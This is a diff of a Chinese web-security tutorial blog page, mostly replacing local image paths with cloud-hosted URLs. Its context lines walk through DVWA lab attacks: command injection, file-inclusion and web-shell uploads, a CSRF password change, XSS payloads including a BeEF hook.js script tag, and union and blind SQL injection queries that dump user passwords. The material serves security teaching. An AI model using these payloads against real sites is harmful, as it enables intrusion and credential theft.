-                <img src="/img/命令执行/1598801287452.png" alt="1598801287452" title class>
+                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1598801287452.png" alt="1598801287452" title class>
                 <p>1598801287452</p>
             </figure>
 
 <figure class="image-box">
-                <img src="/img/命令执行/1598801425250.png" alt="1598801425250" title class>
+                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1598801625275.png" alt="1598801425250" title class>
                 <p>1598801425250</p>
             </figure>
 
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#4.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $arr = $_GET[<span class="string">'arr'</span>];</span><br><span class="line">	$array = <span class="keyword">array</span>(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>);</span><br><span class="line">	$new_array = array_map($arr,$array);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
 <figure class="image-box">
-                <img src="/img/命令执行/1598801625275.png" alt="1598801625275" title class>
+                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1598843280659.png" alt="1598801625275" title class>
                 <p>1598801625275</p>
             </figure>
 
@@ -1181,7 +1181,7 @@
 <p>这里默认是输入一个IP地址就会返回ping的信息，我们利用连接符可以再后面添加我们的命令，并且没有任何过滤</p>
 </blockquote>
 <figure class="image-box">
-                <img src="/img/命令执行/1598843280659.png" alt="1598843280659" title class>
+                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1598844048445.png" alt="1598843280659" title class>
                 <p>1598843280659</p>
             </figure>
 
@@ -1189,7 +1189,7 @@
 <p>这里也没有进行严格过滤</p>
 </blockquote>
 <figure class="image-box">
-                <img src="/img/命令执行/1598843280659.png" alt="1598843280659" title class>
+                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1598844048445.png" alt="1598843280659" title class>
                 <p>1598843280659</p>
             </figure>
 
@@ -1197,7 +1197,7 @@
 <p>进行了过滤，所以这里需要绕过</p>
 </blockquote>
 <figure class="image-box">
-                <img src="/img/命令执行/1598843675551.png" alt="1598843675551" title class>
+                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1598843675551.png" alt="1598843675551" title class>
                 <p>1598843675551</p>
             </figure>
 
@@ -1205,7 +1205,7 @@
 <p>这里对<code>|</code>的过滤是过滤<code>|</code>后面带一个空格，所以我们不输入空格直接执行即可</p>
 </blockquote>
 <figure class="image-box">
-                <img src="/img/命令执行/1598844048445.png" alt="1598844048445" title class>
+                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1598801216337.png" alt="1598844048445" title class>
                 <p>1598844048445</p>
             </figure>
 
@@ -1261,7 +1261,7 @@
 
 <p><code>修改php.txt的扩展名为jpg、rar、aa等都可以解析，只要文件内容符合php语法规范，任何扩展名都可以被php解析</code></p>
 <figure class="image-box">
-                <img src="/img/文件包含/1597760772166.png" alt="1597760772166" title class>
+                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1597760772166.png" alt="1597760772166" title class>
                 <p>1597760772166</p>
             </figure>
 
@@ -1275,7 +1275,7 @@
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#hello.txt 文件不在本地</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">echo</span><span class="string">"hello world"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
 <figure class="image-box">
-                <img src="/img/文件包含/1597760759559.png" alt="1597760759559" title class>
+                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1597760759559.png" alt="1597760759559" title class>
                 <p>1597760759559</p>
             </figure>
 
@@ -1433,7 +1433,7 @@
 </blockquote>
 <p><code>http://192.168.65.128/dvwa/vulnerabilities/fi/?page=../../hackable/uploads/shell.php</code></p>
 <figure class="image-box">
-                <img src="/img/文件包含/1597902587538.png" alt="1597902587538" title class>
+                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1597902587538.png" alt="1597902587538" title class>
                 <p>1597902587538</p>
             </figure>
 
@@ -1442,7 +1442,7 @@
 </blockquote>
 <p><code>?page=C:\phpStudy\PHPTutorial\WWW\DVWA\hackable\uploads\shell.php</code></p>
 <figure class="image-box">
-                <img src="/img/文件包含/1597902875445.png" alt="1597902875445" title class>
+                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1597902875445.png" alt="1597902875445" title class>
                 <p>1597902875445</p>
             </figure>
 
@@ -1451,7 +1451,7 @@
 </blockquote>
 <p><code>?page=file://C:\phpStudy\PHPTutorial\WWW\DVWA\hackable\uploads\shell.php</code></p>
 <figure class="image-box">
-                <img src="/img/文件包含/1597903657754.png" alt="1597903657754" title class>
+                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1597903657754.png" alt="1597903657754" title class>
                 <p>1597903657754</p>
             </figure>
 
@@ -1640,12 +1640,12 @@
 </li>
 </ul>
 <h3 id="菜刀连接"><a href="#菜刀连接" class="headerlink" title="菜刀连接"></a>菜刀连接</h3><figure class="image-box">
-                <img src="/img/文件上传/1598022121925.png" alt="1598022121925" title class>
+                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1598022121925.png" alt="1598022121925" title class>
                 <p>1598022121925</p>
             </figure>
 
 <figure class="image-box">
-                <img src="/img/文件上传/1598024239309.png" alt="1598024239309" title class>
+                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1598012888770.png" alt="1598024239309" title class>
                 <p>1598024239309</p>
             </figure>
 
@@ -1653,7 +1653,7 @@
 <p>直接上传一句话木马</p>
 </blockquote>
 <figure class="image-box">
-                <img src="/img/文件上传/1598012840997.png" alt="1598012840997" title class>
+                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1598024239309.png" alt="1598012840997" title class>
                 <p>1598012840997</p>
             </figure>
 
@@ -1661,7 +1661,7 @@
 <p>没有任何过滤直接上传成功并且返回文件保存的位置</p>
 </blockquote>
 <figure class="image-box">
-                <img src="/img/文件上传/1598012888770.png" alt="1598012888770" title class>
+                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1598012840997.png" alt="1598012888770" title class>
                 <p>1598012888770</p>
             </figure>
 
@@ -1669,7 +1669,7 @@
 <p>我们依旧直接上传木马，发现无法上传要求图片格式</p>
 </blockquote>
 <figure class="image-box">
-                <img src="/img/文件上传/1598013148594.png" alt="1598013148594" title class>
+                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1598018691754.png" alt="1598013148594" title class>
                 <p>1598013148594</p>
             </figure>
 
@@ -1677,12 +1677,12 @@
 <p>这里我们抓包修改MIME类型后再发送，这样就成功绕过上传了我们的shell.php</p>
 </blockquote>
 <figure class="image-box">
-                <img src="/img/文件上传/1598018691754.png" alt="1598018691754" title class>
+                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1598019286315.png" alt="1598018691754" title class>
                 <p>1598018691754</p>
             </figure>
 
 <figure class="image-box">
-                <img src="/img/文件上传/1598018776334.png" alt="1598018776334" title class>
+                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1598018776334.png" alt="1598018776334" title class>
                 <p>1598018776334</p>
             </figure>
 
@@ -1690,12 +1690,12 @@
 <p>这里修改MIME类型也无法上传了，我们直接制作图片马上传就成功了</p>
 </blockquote>
 <figure class="image-box">
-                <img src="/img/文件上传/1598019286315.png" alt="1598019286315" title class>
+                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1598019313281.png" alt="1598019286315" title class>
                 <p>1598019286315</p>
             </figure>
 
 <figure class="image-box">
-                <img src="/img/文件上传/1598019313281.png" alt="1598019313281" title class>
+                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1598013148594.png" alt="1598019313281" title class>
                 <p>1598019313281</p>
             </figure>
 
@@ -1762,7 +1762,7 @@
 <p>首先我们抓取一下修改密码的数据包</p>
 </blockquote>
 <figure class="image-box">
-                <img src="/img/csrf/1597419644211.png" alt="1597419644211" title class>
+                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1597420636366.png" alt="1597419644211" title class>
                 <p>1597419644211</p>
             </figure>
 
@@ -1774,7 +1774,7 @@
 <p>访问payload发现密码被修改为admin了</p>
 </blockquote>
 <figure class="image-box">
-                <img src="/img/csrf/1597420000299.png" alt="1597420000299" title class>
+                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1597420000299.png" alt="1597420000299" title class>
                 <p>1597420000299</p>
             </figure>
 
@@ -1783,7 +1783,7 @@
 </blockquote>
 <p><code>http://192.168.65.128/dvwa/vulnerabilities/csrf/?password_new=admin&amp;password_conf=admin&amp;Change=Change</code></p>
 <figure class="image-box">
-                <img src="/img/csrf/1597420317135.png" alt="1597420317135" title class>
+                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1597419644211.png" alt="1597420317135" title class>
                 <p>1597420317135</p>
             </figure>
 
@@ -1791,12 +1791,12 @@
 <p>我抓取正常修改时候数据包看一下情况和直接使用payload差别,发现payload缺少referer字段</p>
 </blockquote>
 <figure class="image-box">
-                <img src="/img/csrf/1597420636366.png" alt="1597420636366" title class>
+                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1597420317135.png" alt="1597420636366" title class>
                 <p>1597420636366</p>
             </figure>
 
 <figure class="image-box">
-                <img src="/img/csrf/1597420578010.png" alt="1597420578010" title class>
+                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1597421183227.png" alt="1597420578010" title class>
                 <p>1597420578010</p>
             </figure>
 
@@ -1804,7 +1804,7 @@
 <p>我们直接用payload抓包并自己添加主机名到referer字段发现能修改成功</p>
 </blockquote>
 <figure class="image-box">
-                <img src="/img/csrf/1597421183227.png" alt="1597421183227" title class>
+                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1597422122860.png" alt="1597421183227" title class>
                 <p>1597421183227</p>
             </figure>
 
@@ -1815,7 +1815,7 @@
 <p>这里我们发现修改密码时候带上了tokne验证,所以我们无法直接实现CSRF攻击,这些我们就要结合其他漏洞一起才能利用啦,比如xss漏洞等</p>
 </blockquote>
 <figure class="image-box">
-                <img src="/img/csrf/1597422122860.png" alt="1597422122860" title class>
+                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1597420578010.png" alt="1597422122860" title class>
                 <p>1597422122860</p>
             </figure>
 
@@ -1879,12 +1879,12 @@
 
 <p><code>&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;</code></p>
 <figure class="image-box">
-                <img src="/img/xss/1597249147737.png" alt="1597249147737" title class>
+                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1597249147737.png" alt="1597249147737" title class>
                 <p>1597249147737</p>
             </figure>
 
 <figure class="image-box">
-                <img src="/img/xss/1597249160807.png" alt="1597249160807" title class>
+                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1597251966287.png" alt="1597249160807" title class>
                 <p>1597249160807</p>
             </figure>
 
@@ -1906,19 +1906,19 @@
 
 <p><code>&lt;script&gt;alert(\&#39;xss\&#39;)&lt;/script&gt;</code>\用来转义</p>
 <figure class="image-box">
-                <img src="/img/xss/1597249586099.png" alt="1597249586099" title class>
+                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1597252051220.png" alt="1597249586099" title class>
                 <p>1597249586099</p>
             </figure>
 
 <p>查看数据库插入情况发现刚刚语句被插入到数据库中啦</p>
 <figure class="image-box">
-                <img src="/img/xss/1597251966287.png" alt="1597251966287" title class>
+                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1597249160807.png" alt="1597251966287" title class>
                 <p>1597251966287</p>
             </figure>
 
 <p>在查看页面查看数据<code>http://127.0.0.1/xss/show.php?id=1</code>发现语句被成功执行</p>
 <figure class="image-box">
-                <img src="/img/xss/1597252051220.png" alt="1597252051220" title class>
+                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1597249586099.png" alt="1597252051220" title class>
                 <p>1597252051220</p>
             </figure>
 
@@ -1933,12 +1933,12 @@
 
 <p><code>&lt;img src=1 onerror=alert(&#39;xss&#39;)&gt;</code></p>
 <figure class="image-box">
-                <img src="/img/xss/1597252179215.png" alt="1597252179215" title class>
+                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1597252179215.png" alt="1597252179215" title class>
                 <p>1597252179215</p>
             </figure>
 
 <figure class="image-box">
-                <img src="/img/xss/1597252486630.png" alt="1597252486630" title class>
+                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1597405925377.png" alt="1597252486630" title class>
                 <p>1597252486630</p>
             </figure>
 
@@ -2040,7 +2040,7 @@
 <p>登录UI管理界面</p>
 </blockquote>
 <figure class="image-box">
-                <img src="/img/xss/1597405925377.png" alt="1597405925377" title class>
+                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1597252486630.png" alt="1597405925377" title class>
                 <p>1597405925377</p>
             </figure>
 
@@ -2048,7 +2048,7 @@
 <p>然后将<code>&lt;script src=&quot;http://&lt;IP&gt;:3000/hook.js&quot;&gt;&lt;/script&gt;</code>作为xss语句注入，钩子被触发，目标就会自动上线</p>
 </blockquote>
 <figure class="image-box">
-                <img src="/img/xss/1597406088818.png" alt="1597406088818" title class>
+                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1597310308297.png" alt="1597406088818" title class>
                 <p>1597406088818</p>
             </figure>
 
@@ -2056,7 +2056,7 @@
 <p>这里命令慢慢摸索吧</p>
 </blockquote>
 <figure class="image-box">
-                <img src="/img/xss/1597409122987.png" alt="1597409122987" title class>
+                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1597406088818.png" alt="1597409122987" title class>
                 <p>1597409122987</p>
             </figure>
 
@@ -2064,7 +2064,7 @@
 <p>XSS原则见框就插，我们发现这里不管输入说明都直接回显</p>
 </blockquote>
 <figure class="image-box">
-                <img src="/img/xss/1597310308297.png" alt="1597310308297" title class>
+                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1597310549808.png" alt="1597310308297" title class>
                 <p>1597310308297</p>
             </figure>
 
@@ -2073,7 +2073,7 @@
 <p>插入测试语句发现直接弹窗</p>
 </blockquote>
 <figure class="image-box">
-                <img src="/img/xss/1597310549808.png" alt="1597310549808" title class>
+                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1597310786907.png" alt="1597310549808" title class>
                 <p>1597310549808</p>
             </figure>
 
@@ -2081,7 +2081,7 @@
 <p>这里我们直接输入测试语句发<code>&lt;script&gt;&lt;/script&gt;</code>被过滤了</p>
 </blockquote>
 <figure class="image-box">
-                <img src="/img/xss/1597310786907.png" alt="1597310786907" title class>
+                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1597310947363.png" alt="1597310786907" title class>
                 <p>1597310786907</p>
             </figure>
 
@@ -2090,7 +2090,7 @@
 <p>这里我们直接用img标签插入成功回弹，这里可以使用大小写绕过</p>
 </blockquote>
 <figure class="image-box">
-                <img src="/img/xss/1597310947363.png" alt="1597310947363" title class>
+                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1597319991473.png" alt="1597310947363" title class>
                 <p>1597310947363</p>
             </figure>
 
@@ -2098,7 +2098,7 @@
 <p>通过测试发现这里过滤<code>&lt;script&gt;</code>开头的语句,所以使用<code>&lt;img src=1 onerror=alert(&#39;xss&#39;)&gt;</code></p>
 </blockquote>
 <figure class="image-box">
-                <img src="/img/xss/1597319991473.png" alt="1597319991473" title class>
+                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1597320660164.png" alt="1597319991473" title class>
                 <p>1597319991473</p>
             </figure>
 
@@ -2106,14 +2106,14 @@
 <p>输入内容发现，会保存到数据库，每次打开都会查询并显示出来</p>
 </blockquote>
 <figure class="image-box">
-                <img src="/img/xss/1597320660164.png" alt="1597320660164" title class>
+                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1597320803531.png" alt="1597320660164" title class>
                 <p>1597320660164</p>
             </figure>
 
 <p>name：<code>test</code></p>
 <p>message：<code>&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;</code></p>
 <figure class="image-box">
-                <img src="/img/xss/1597320803531.png" alt="1597320803531" title class>
+                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1597409122987.png" alt="1597320803531" title class>
                 <p>1597320803531</p>
             </figure>
 
@@ -2121,14 +2121,14 @@
 <p>这里过滤了<code>&lt;script&gt;</code>标签,并且message也过滤了<code>img</code>标签，所以我尝试在name中插入，但是name有长度限制我们抓包修改一下</p>
 </blockquote>
 <figure class="image-box">
-                <img src="/img/xss/1597321652662.png" alt="1597321652662" title class>
+                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1597321652662.png" alt="1597321652662" title class>
                 <p>1597321652662</p>
             </figure>
 
 <p>name：<code>&lt;img src=1 onerror=alert(&#39;xss&#39;)&gt;</code></p>
 <p>message：<code>test</code></p>
 <figure class="image-box">
-                <img src="/img/xss/1597322464689.png" alt="1597322464689" title class>
+                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1597322478517.png" alt="1597322464689" title class>
                 <p>1597322464689</p>
             </figure>
 
@@ -2136,7 +2136,7 @@
 <p>抓包修改了，成功执行xss语句</p>
 </blockquote>
 <figure class="image-box">
-                <img src="/img/xss/1597322478517.png" alt="1597322478517" title class>
+                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1597322464689.png" alt="1597322478517" title class>
                 <p>1597322478517</p>
             </figure>
 
@@ -2144,12 +2144,12 @@
 <p>这里我们直接用<code>&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;</code>尝试发现都给过滤了，然后采用<code>img</code>标签尝试，但是name依旧有长度限制，我们这次尝试在浏览器中修改长度</p>
 </blockquote>
 <figure class="image-box">
-                <img src="/img/xss/1597322686394.png" alt="1597322686394" title class>
+                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1597322686394.png" alt="1597322686394" title class>
                 <p>1597322686394</p>
             </figure>
 
 <figure class="image-box">
-                <img src="/img/xss/1597322735493.png" alt="1597322735493" title class>
+                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1597322751829.png" alt="1597322735493" title class>
                 <p>1597322735493</p>
             </figure>
 
@@ -2159,7 +2159,7 @@
 <p>语句成功执行</p>
 </blockquote>
 <figure class="image-box">
-                <img src="/img/xss/1597322751829.png" alt="1597322751829" title class>
+                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1597322735493.png" alt="1597322751829" title class>
                 <p>1597322751829</p>
             </figure>
 
@@ -2541,7 +2541,7 @@ information_schema.tables where table_schema=database() limit 0,1))=5,sleep(5),1
 <p>输入1，正常回显；输入1’报错，说明有注入点</p>
 </blockquote>
 <figure class="image-box">
-                <img src="/img/sql注入/1597150763322.png" alt="1597150763322" title class>
+                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1597150763322.png" alt="1597150763322" title class>
                 <p>1597150763322</p>
             </figure>
 
@@ -2551,7 +2551,7 @@ information_schema.tables where table_schema=database() limit 0,1))=5,sleep(5),1
 </blockquote>
 <p><code>1&#39; order 1#</code></p>
 <figure class="image-box">
-                <img src="/img/sql注入/1597151437412.png" alt="1597151437412" title class>
+                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1597151437412.png" alt="1597151437412" title class>
                 <p>1597151437412</p>
             </figure>
 
@@ -2561,7 +2561,7 @@ information_schema.tables where table_schema=database() limit 0,1))=5,sleep(5),1
 </blockquote>
 <p><code>-1&#39; union select 1,2#</code></p>
 <figure class="image-box">
-                <img src="/img/sql注入/1597151508527.png" alt="1597151508527" title class>
+                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1597151782271.png" alt="1597151508527" title class>
                 <p>1597151508527</p>
             </figure>
 
@@ -2570,7 +2570,7 @@ information_schema.tables where table_schema=database() limit 0,1))=5,sleep(5),1
 </blockquote>
 <p><code>-1&#39; union select database(),version()#</code></p>
 <figure class="image-box">
-                <img src="/img/sql注入/1597151782271.png" alt="1597151782271" title class>
+                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1597151508527.png" alt="1597151782271" title class>
                 <p>1597151782271</p>
             </figure>
 
@@ -2579,7 +2579,7 @@ information_schema.tables where table_schema=database() limit 0,1))=5,sleep(5),1
 </blockquote>
 <p><code>-1&#39; union select 1,schema_name from information_schema.schemata#</code></p>
 <figure class="image-box">
-                <img src="/img/sql注入/1597152579142.png" alt="1597152579142" title class>
+                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1597152579142.png" alt="1597152579142" title class>
                 <p>1597152579142</p>
             </figure>
 
@@ -2588,7 +2588,7 @@ information_schema.tables where table_schema=database() limit 0,1))=5,sleep(5),1
 </blockquote>
 <p><code>-1&#39; union select 1,table_name from information_schema.tables where table_schema=&quot;dvwa&quot;#</code></p>
 <figure class="image-box">
-                <img src="/img/sql注入/1597153650280.png" alt="1597153650280" title class>
+                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1597154167541.png" alt="1597153650280" title class>
                 <p>1597153650280</p>
             </figure>
 
@@ -2597,7 +2597,7 @@ information_schema.tables where table_schema=database() limit 0,1))=5,sleep(5),1
 </blockquote>
 <p><code>-1&#39; union select 1,column_name from information_schema.columns where table_name=&quot;users&quot;#</code></p>
 <figure class="image-box">
-                <img src="/img/sql注入/1597153814658.png" alt="1597153814658" title class>
+                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1597153650280.png" alt="1597153814658" title class>
                 <p>1597153814658</p>
             </figure>
 
@@ -2606,19 +2606,19 @@ information_schema.tables where table_schema=database() limit 0,1))=5,sleep(5),1
 </blockquote>
 <p><code>-1&#39; union select user,password from users#</code></p>
 <figure class="image-box">
-                <img src="/img/sql注入/1597154167541.png" alt="1597154167541" title class>
+                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1597153814658.png" alt="1597154167541" title class>
                 <p>1597154167541</p>
             </figure>
 
 <h5 id="Medium"><a href="#Medium" class="headerlink" title="Medium"></a>Medium</h5><blockquote>
 <p>这里限制了输入，我们需要抓包进行修改</p>
 </blockquote>
-<p> <img src="/img/sql%E6%B3%A8%E5%85%A5/1597157686281.png" alt="1597157686281"></p>
+<p> <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1597157686281.png" alt="1597157686281"></p>
 <blockquote>
 <p>和前面一样尝试我们发现，但这里是整数型不需要闭合，其余都和前面都一样，所以查看数据的具体步骤就省略了</p>
 </blockquote>
 <figure class="image-box">
-                <img src="/img/sql注入/1597157823757.png" alt="1597157823757" title class>
+                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1597158059688.png" alt="1597157823757" title class>
                 <p>1597157823757</p>
             </figure>
 
@@ -2626,27 +2626,27 @@ information_schema.tables where table_schema=database() limit 0,1))=5,sleep(5),1
 <p>这里跳转到另外一个界面输入信息，防止了自动化SQL注入，但是方法依旧和(LOW)级别一样，只是换了个位置输入，过程就不演示啦。</p>
 </blockquote>
 <figure class="image-box">
-                <img src="/img/sql注入/1597158059688.png" alt="1597158059688" title class>
+                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1597158559411.png" alt="1597158059688" title class>
                 <p>1597158059688</p>
             </figure>
 
 <figure class="image-box">
-                <img src="/img/sql注入/1597158084811.png" alt="1597158084811" title class>
+                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1597158084811.png" alt="1597158084811" title class>
                 <p>1597158084811</p>
             </figure>
 
 <figure class="image-box">
-                <img src="/img/sql注入/1597158559411.png" alt="1597158559411" title class>
+                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1597160077983.png" alt="1597158559411" title class>
                 <p>1597158559411</p>
             </figure>
 
 <h4 id="盲注-1"><a href="#盲注-1" class="headerlink" title="盲注"></a>盲注</h4><h5 id="low-1"><a href="#low-1" class="headerlink" title="low"></a>low</h5><figure class="image-box">
-                <img src="/img/sql注入/1597160077983.png" alt="1597160077983" title class>
+                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1597160098860.png" alt="1597160077983" title class>
                 <p>1597160077983</p>
             </figure>
 
 <figure class="image-box">
-                <img src="/img/sql注入/1597160098860.png" alt="1597160098860" title class>
+                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1597161192485.png" alt="1597160098860" title class>
                 <p>1597160098860</p>
             </figure>
 
@@ -2655,13 +2655,13 @@ information_schema.tables where table_schema=database() limit 0,1))=5,sleep(5),1
 </blockquote>
 <p><code>1&#39; and (length(database()))&lt;4#</code></p>
 <figure class="image-box">
-                <img src="/img/sql注入/1597161173004.png" alt="1597161173004" title class>
+                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1597157823757.png" alt="1597161173004" title class>
                 <p>1597161173004</p>
             </figure>
 
 <p><code>1&#39; and (length(database()))&lt;5#</code></p>
 <figure class="image-box">
-                <img src="/img/sql注入/1597161192485.png" alt="1597161192485" title class>
+                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1597162589046.png" alt="1597161192485" title class>
                 <p>1597161192485</p>
             </figure>
 
@@ -2670,13 +2670,13 @@ information_schema.tables where table_schema=database() limit 0,1))=5,sleep(5),1
 </blockquote>
 <p><code>1&#39; and (ascii(substr(database(),1,1)))&gt;100#</code></p>
 <figure class="image-box">
-                <img src="/img/sql注入/1597161443050.png" alt="1597161443050" title class>
+                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1597161173004.png" alt="1597161443050" title class>
                 <p>1597161443050</p>
             </figure>
 
 <p><code>1&#39; and (ascii(substr(database(),1,1)))&gt;99#</code></p>
 <figure class="image-box">
-                <img src="/img/sql注入/1597161459673.png" alt="1597161459673" title class>
+                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1597162575060.png" alt="1597161459673" title class>
                 <p>1597161459673</p>
             </figure>
 
@@ -2685,13 +2685,13 @@ information_schema.tables where table_schema=database() limit 0,1))=5,sleep(5),1
 </blockquote>
 <p><code>1&#39; and(length((select table_name from information_schema.tables where table_schema=database() limit 0,1)))&lt;10#</code></p>
 <figure class="image-box">
-                <img src="/img/sql注入/1597162575060.png" alt="1597162575060" title class>
+                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1597162862636.png" alt="1597162575060" title class>
                 <p>1597162575060</p>
             </figure>
 
 <p><code>1&#39; and(length((select table_name from information_schema.tables where table_schema=database() limit 0,1)))&lt;9#</code></p>
 <figure class="image-box">
-                <img src="/img/sql注入/1597162589046.png" alt="1597162589046" title class>
+                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1597161443050.png" alt="1597162589046" title class>
                 <p>1597162589046</p>
             </figure>
 
@@ -2700,13 +2700,13 @@ information_schema.tables where table_schema=database() limit 0,1))=5,sleep(5),1
 </blockquote>
 <p><code>1&#39; and(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)))&lt;103#</code></p>
 <figure class="image-box">
-                <img src="/img/sql注入/1597162797589.png" alt="1597162797589" title class>
+                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1597162797589.png" alt="1597162797589" title class>
                 <p>1597162797589</p>
             </figure>
 
 <p><code>1&#39; and(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)))&lt;104#</code></p>
 <figure class="image-box">
-                <img src="/img/sql注入/1597162862636.png" alt="1597162862636" title class>
+                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1597163115723.png" alt="1597162862636" title class>
                 <p>1597162862636</p>
             </figure>
 
@@ -2715,13 +2715,13 @@ information_schema.tables where table_schema=database() limit 0,1))=5,sleep(5),1
 </blockquote>
 <p><code>1&#39; and (length((select column_name from information_schema.columns where table_name=&quot;guestbook&quot; limit 2,1)))&lt;5#</code></p>
 <figure class="image-box">
-                <img src="/img/sql注入/1597163115723.png" alt="1597163115723" title class>
+                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1597163275391.png" alt="1597163115723" title class>
                 <p>1597163115723</p>
             </figure>
 
 <p><code>1&#39; and (length((select column_name from information_schema.columns where table_name=&quot;guestbook&quot; limit 2,1)))&lt;4#</code></p>
 <figure class="image-box">
-                <img src="/img/sql注入/1597163128591.png" alt="1597163128591" title class>
